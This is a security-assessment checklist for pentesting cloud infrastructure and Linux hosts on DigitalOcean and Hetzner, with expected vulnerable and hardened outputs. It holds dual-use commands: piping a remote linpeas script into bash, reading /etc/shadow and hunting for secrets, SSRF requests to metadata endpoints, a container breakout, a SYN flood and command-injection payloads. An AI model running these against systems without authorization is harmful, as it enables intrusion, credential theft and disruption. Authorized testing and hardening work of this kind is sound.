# Exploit-Forge — Infra Security Assessment Checklist

**Source of truth for cloud + host infrastructure security assessments (DigitalOcean / Hetzner focus).**

> Scope covers external attack-surface enumeration, internal host-level misconfiguration auditing, and cloud-provider config review. Use the section that matches your access level and engagement scope.

---

## SECTION 0 — Pre-Engagement & Authorization

Before running anything below, confirm:

- [ ] Written authorization / signed scope covering every in-scope IP, domain, and account.
- [ ] Explicit list of out-of-bounds targets (shared infra, third-party SaaS, prod databases).
- [ ] Rules of engagement for intrusive tests (flooding, brute force, exploitation).
- [ ] A rollback / emergency contact and a defined testing window.
- [ ] Confirmation that host-level commands are permitted on the specific machine(s).

> The host-level and exploitation commands here are dual-use. Only run them against systems you are authorized in writing to test.

---

## SECTION 1 — External Cloud Infra Pentest (No SSH Required)

*Simulates an attacker from the internet.*

### 1. Reconnaissance & Asset Discovery

**Subdomain Enumeration**
```bash
subfinder -d target.com -all -recursive -o subdomains.txt
amass enum -d target.com -o amass_subs.txt
assetfinder --subs-only target.com
```

**DNS Bruteforce**
```bash
dnsx -d target.com -w /usr/share/wordlists/dns.txt -o dns_brute.txt
```

**Cloud / Hosting Fingerprinting**
```bash
whois <IP>
rdap <IP>
curl -I http://<IP>
```
Look for: DO / Hetzner ranges, CDN leaks, email server leaks, tech stack leaks.

### 2. Live Host Identification
```bash
httpx -l subdomains.txt -o live.txt -status-code -tech-detect
naabu -list live.txt -top-ports 1000 -o ports.txt
```
Look for: exposed admin panels, exposed databases, misconfigured services.

### 3. Service Enumeration

Loop all IPs & ports:
```bash
nmap -sV -sC -p- -T4 <IP> -oN nmap_full.txt
```

**SSH Enumeration**
```bash
nmap -p22 --script ssh2-enum-algos,sshv1,ssh-hostkey <IP>
```
Findings: SSHv1 enabled, weak key exchange, outdated OpenSSH version.

**HTTP Enumeration**
```bash
whatweb <URL>
nmap -p80,443 --script http-enum <URL>
```

**DirBust**
```bash
feroxbuster -u https://target.com -w /usr/share/wordlists/dir.txt
```

### 4. Vulnerability Scanning (External)
```bash
nuclei -u https://target.com -severity low,medium,high,critical
```

**SSL/TLS Testing**
```bash
sslyze --regular target.com
nmap -p443 --script ssl-enum-ciphers,ssl-cert,ssl-date target.com
```
Findings: TLS 1.0/1.1 enabled, weak ciphers, self-signed SSL.

### 5. Cloud Metadata Attack Simulation (No SSH needed)

If web server is vulnerable to SSRF:
```bash
curl http://169.254.169.254/metadata/v1        # DigitalOcean
curl http://169.254.169.254/metadata           # Hetzner
```
Look for: cloud tokens, VM hostname, user-data scripts, SSH key leakage.

### 6. Storage / Backup Exposure
```bash
aws s3 ls s3://bucket-name --no-sign-request    # DigitalOcean Spaces
s3cmd ls --configure                             # Hetzner Object Storage
```
Findings: public buckets, downloadable code/logs/envs.

### 7. Firewall / Network Exposure Testing
```bash
nmap -sV -p- <IP>
hping3 -S <IP> -p <PORT> --flood               # intrusive — authorized scope only
```
Look for: internal services exposed to the internet; Redis/MySQL/MongoDB without auth; OpenVPN ports exposed unnecessarily.

---

## SECTION 2 — Internal / Host-Level Cloud Pentest (SSH Required)

*Simulates an attacker with low-privilege access or a compromised developer machine.*

### 2A. Core Checks

**1. Privilege Escalation Enumeration**
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
sudo -l
id
uname -a
ls -lah /home
cat /etc/passwd
cat /etc/shadow        # root only
```
Findings: weak sudo configs, kernel privesc, writable system binaries.

**2. Credential & Secret Hunting**
```bash
find / -name ".env" 2>/dev/null
grep -R "SECRET\|TOKEN\|PASSWORD" /etc 2>/dev/null
cat ~/.bash_history
ls -lah ~/.ssh
```
High-value: production DB passwords, API keys, hardcoded cloud keys, SSH private keys.

**3. OS Hardening Checks**
```bash
cat /etc/login.defs
ufw status
iptables -L -n
systemctl list-units --type=service
netstat -tulpn
```

**4. Docker / Container Escapes**
```bash
docker ps
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # breakout test
```
Findings: Docker socket exposed, privileged containers, breakout possible.

**5. Database Security Review**
```bash
mysql -u root -p
  SHOW DATABASES;
  SELECT user, host FROM mysql.user;
psql -U postgres
  \du
```
Findings: remote root, no password, wildcard host `%`, superuser roles given to apps.

**6. Cloud Networking & Pivoting**
```bash
ip a
ip route
arp -a
nmap -sV -p- 10.0.0.0/24
```
Findings: internal DBs exposed, no segmentation, weak firewall isolation.

**7. Log & Monitoring Review**
```bash
cat /var/log/auth.log
cat /var/log/syslog
```
Look for: credentials in logs, sensitive HTTP logs, ignored attack traces.

---

### 2B. Extended Misconfiguration Audit (with expected output)

For each check: 🚩 = vulnerable indicator, ✅ = hardened indicator.

#### 1. SUID / SGID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -perm -2000 -type f 2>/dev/null      # SGID
```
🚩 Unusual/exploitable binaries (cross-check GTFOBins):
```
/usr/bin/find
/usr/bin/vim
/usr/bin/python3.11
/home/dev/backup.sh
```
✅ Expected baseline only:
```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
```

#### 2. File Capabilities
```bash
getcap -r / 2>/dev/null
```
🚩 `cap_setuid` on an interpreter ≈ instant root:
```
/usr/bin/python3.11 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```
✅ Only networking caps on networking tools:
```
/usr/bin/ping = cap_net_raw+ep
/usr/sbin/arping = cap_net_raw+ep
```

#### 3. World-Writable Files & Directories
```bash
find / -xdev -type f -perm -0002 2>/dev/null
find / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null   # writable dirs missing sticky bit
```
🚩 Writable config/scripts or `/tmp` without sticky bit:
```
/etc/passwd
/opt/app/config.py
/var/www/html/index.php
/tmp        (no sticky bit)
```
✅ Empty file output; `/tmp` shows `drwxrwxrwt` (sticky set, so absent from the dir result).

#### 4. Cron Job Security
```bash
ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null
cat /etc/crontab
grep -R "" /etc/cron.d/ 2>/dev/null
```
🚩 World-writable script run as root:
```
-rwxrwxrwx 1 root root  220 backup.sh
* * * * * root /opt/scripts/cleanup.sh
```
✅ Root-owned, not writable by others:
```
-rwxr-xr-x 1 root root  220 backup.sh
```
Rule: any script in a root cron job must not be writable by non-root, and neither must its parent dir.

#### 5. SSH Server Configuration
```bash
sudo sshd -T 2>/dev/null | grep -iE 'permitrootlogin|passwordauth|permitemptypass|x11|maxauthtries|protocol|allowtcp'
```
🚩 Vulnerable:
```
permitrootlogin yes
passwordauthentication yes
permitemptypasswords yes
x11forwarding yes
maxauthtries 6
```
✅ Hardened:
```
permitrootlogin no            (or prohibit-password)
passwordauthentication no     (keys only)
permitemptypasswords no
x11forwarding no
maxauthtries 3
```
`sshd -T` shows the *effective* config including defaults — more reliable than grepping the file.

#### 6. Sudo Deep Audit
```bash
sudo -l
grep -vE '^#|^$' /etc/sudoers /etc/sudoers.d/* 2>/dev/null    # root only
```
🚩 Vulnerable:
```
(ALL) NOPASSWD: ALL
(root) NOPASSWD: /usr/bin/vim
(root) /usr/bin/less, /usr/bin/find
env_keep += LD_PRELOAD
```
NOPASSWD on any GTFOBins-able binary (`vim`, `less`, `find`, `awk`, `nano`...) = root. `LD_PRELOAD`/`LD_LIBRARY_PATH` in `env_keep` is a known escalation.

✅ Hardened:
```
(root) /usr/bin/systemctl restart nginx     # scoped, password required
Defaults    env_reset
Defaults    requiretty
```

#### 7. Kernel / sysctl Hardening
```bash
sysctl kernel.randomize_va_space kernel.kptr_restrict kernel.dmesg_restrict \
       kernel.yama.ptrace_scope fs.suid_dumpable \
       net.ipv4.conf.all.rp_filter net.ipv4.ip_forward 2>/dev/null
```
🚩 Vulnerable:
```
kernel.randomize_va_space = 0     # ASLR off
kernel.kptr_restrict = 0
kernel.dmesg_restrict = 0
kernel.yama.ptrace_scope = 0
fs.suid_dumpable = 1
net.ipv4.ip_forward = 1           # unexpected on a non-router
```
✅ Hardened:
```
kernel.randomize_va_space = 2
kernel.kptr_restrict = 1          (or 2)
kernel.dmesg_restrict = 1
kernel.yama.ptrace_scope = 1      (or higher)
fs.suid_dumpable = 0
```

#### 8. Mount Options
```bash
mount | grep -E 'on /tmp|on /var|on /home|on /dev/shm'
findmnt -lo TARGET,OPTIONS
```
🚩 Vulnerable:
```
/tmp ... (rw,relatime)            # missing nosuid,nodev,noexec
/dev/shm ... (rw)                 # missing noexec
```
✅ Hardened:
```
/tmp ... (rw,nosuid,nodev,noexec)
/dev/shm ... (rw,nosuid,nodev,noexec)
```

#### 9. Mandatory Access Control (SELinux / AppArmor)
```bash
getenforce 2>/dev/null            # RHEL/CentOS
sestatus 2>/dev/null
aa-status 2>/dev/null             # Debian/Ubuntu
```
🚩 Vulnerable:
```
Disabled
apparmor module is loaded. 0 profiles are in enforce mode.
```
✅ Hardened:
```
Enforcing
12 profiles are in enforce mode.
```

#### 10. Account & Password Policy
```bash
awk -F: '($3==0){print $1}' /etc/passwd          # all UID 0 accounts
awk -F: '($2==""){print $1}' /etc/shadow         # empty-password accounts (root only)
grep -E 'PASS_MAX_DAYS|PASS_MIN_LEN|PASS_WARN' /etc/login.defs
awk -F: '($7 ~ /(bash|sh|zsh)$/){print $1,$7}' /etc/passwd   # accounts with shells
```
🚩 Vulnerable:
```
root
toor                              # second UID 0 = backdoor
backup:                           # empty password
PASS_MAX_DAYS   99999             # never expires
mysql /bin/bash                   # service account with a real shell
```
✅ Hardened:
```
root                              # only one UID 0
(empty for empty-password check)
PASS_MAX_DAYS   90
mysql /usr/sbin/nologin
```

#### 11. Systemd Service Hardening
```bash
systemd-analyze security 2>/dev/null
systemd-analyze security nginx.service 2>/dev/null
```
🚩 Vulnerable (high exposure score):
```
nginx.service        9.6  UNSAFE
mysql.service        9.2  UNSAFE
```
✅ Hardened:
```
nginx.service        2.1  OK
```
Lower is better; the report lists missing directives (`NoNewPrivileges`, `ProtectSystem`, `PrivateTmp`, ...).

#### 12. Audit & Logging
```bash
systemctl is-active auditd 2>/dev/null
auditctl -l 2>/dev/null            # root only
systemctl is-active rsyslog systemd-journald 2>/dev/null
```
🚩 Vulnerable:
```
inactive                          # auditd not running
No rules
```
✅ Hardened:
```
active
-w /etc/passwd -p wa -k identity
-w /etc/sudoers -p wa -k scope
```

#### 13. Patch / Update Hygiene
```bash
# Debian/Ubuntu
apt list --upgradable 2>/dev/null | grep -i security
grep -E 'Unattended-Upgrade::Allowed' /etc/apt/apt.conf.d/50unattended-upgrades 2>/dev/null
# RHEL/CentOS
yum updateinfo list security 2>/dev/null
```
🚩 Vulnerable:
```
openssl/.../security  (upgradable)
libssl3/...           (upgradable)
```
✅ Hardened: no pending security updates; unattended-security-upgrades enabled.

#### 14. NFS / Shared Exports
```bash
cat /etc/exports 2>/dev/null
showmount -e localhost 2>/dev/null
```
🚩 Vulnerable:
```
/srv/share  *(rw,no_root_squash,insecure)
```
`no_root_squash` lets remote root stay root; `*` exports to the world.

✅ Hardened:
```
/srv/share  10.0.0.0/24(ro,root_squash,sync,no_subtree_check)
```

---

### 2C. Running as a Least-Privileged SSH Account

Most checks above are read-only enumeration and run fine unprivileged. Some silently degrade — a permission error suppressed by `2>/dev/null` can look identical to a clean result.

**Works fully without root**
- SUID/SGID find, file capabilities, world-writable search
- Cron files in `/etc/crontab`, `/etc/cron.d/`
- `sysctl` reads, mount options, MAC status
- UID 0 / shells from `/etc/passwd`, `/etc/login.defs`
- NFS `/etc/exports`, `showmount -e localhost`
- `apt list --upgradable`

**Degrades or fails without root**
| Check | Behavior unprivileged |
|---|---|
| `/etc/shadow` empty-password check | Permission denied — no output ≠ secure |
| `sshd -T` | Needs root; fall back to reading `/etc/ssh/sshd_config` (uncommented lines only) |
| `sudo -l` | Prompts for your password; only useful if you know it |
| `/etc/sudoers`, `/etc/sudoers.d/` | Root-only (0440); infer from `sudo -l` instead |
| `systemd-analyze security` | Runs, but per-unit detail incomplete |
| `auditctl -l` | Needs `CAP_AUDIT_CONTROL` |
| `yum updateinfo` | May need root |

**The trap:** `2>/dev/null` turns a permission error into silence that reads like a pass. On checks touching protected files, drop `2>/dev/null` so "clean" and "access denied" are distinguishable.

**Recommended low-priv flow**
1. Run `linpeas.sh` — built to enumerate everything readable unprivileged and flag privesc paths, marking what it couldn't access.
2. Treat the low-priv pass as "find a way up."
3. Re-run root-only checks (shadow, sudoers, `sshd -T`, `auditctl`) after escalation or via a sudo-enabled audit account.

> For a genuine hardening audit (vs. attacker simulation), provision a dedicated audit account with read access to protected files, or run with sudo — otherwise a chunk of the OS-hardening section is invisible.

---

## SECTION 3 — Cloud Config Review (No SSH Needed)

### DigitalOcean Checklist
- [ ] Firewall inbound/outbound rules
- [ ] Droplet snapshot permissions
- [ ] Publicly exposed Volumes
- [ ] Public Object Storage (Spaces)
- [ ] VPC segmentation
- [ ] DNS misconfigurations

### Hetzner Checklist
- [ ] Hetzner firewall rules
- [ ] Publicly accessible Private Network
- [ ] Object Storage (S3) permissions
- [ ] Snapshot visibility
- [ ] Floating IP misconfig

---

## SECTION 4 — Payloads

**SSRF**
```
http://169.254.169.254/metadata/v1/user-data
```

**Redis exploit check**
```bash
redis-cli -h <IP> info
```

**MySQL weak auth check**
```bash
mysql -u root -p -h <IP>
```

**RCE detection**
```
; id
&& id
| id
$(id)
`id`
```

---

## FINAL SECTION — Summary Checklist

### External Pentest
- [ ] Subdomains discovered
- [ ] Live hosts mapped
- [ ] Ports scanned
- [ ] Services enumerated
- [ ] Vulnerability scanning
- [ ] TLS checks
- [ ] Metadata attack tests
- [ ] Storage/bucket checks
- [ ] Firewall exposure analysis

### Internal Pentest — Core
- [ ] Privilege escalation enumeration
- [ ] Credential & secret hunting
- [ ] Docker/K8s escalation
- [ ] Database security validation
- [ ] OS hardening review
- [ ] Internal network pivoting
- [ ] Log and monitoring assessment

### Internal Pentest — Extended Misconfiguration Audit
- [ ] SUID/SGID binaries
- [ ] File capabilities
- [ ] World-writable files & directories
- [ ] Cron job security
- [ ] SSH server configuration (`sshd -T`)
- [ ] Sudo deep audit
- [ ] Kernel / sysctl hardening
- [ ] Mount options (nosuid/nodev/noexec)
- [ ] SELinux / AppArmor enforcement
- [ ] Account & password policy
- [ ] Systemd service hardening
- [ ] Audit & logging (auditd)
- [ ] Patch / update hygiene
- [ ] NFS / shared exports

### Cloud Config Review
- [ ] DigitalOcean config reviewed
- [ ] Hetzner config reviewed

### Access-Level Notes
- [ ] Confirmed which checks ran unprivileged vs. required root
- [ ] Re-ran root-only checks after escalation / with sudo account
- [ ] Verified clean results aren't masked permission errors
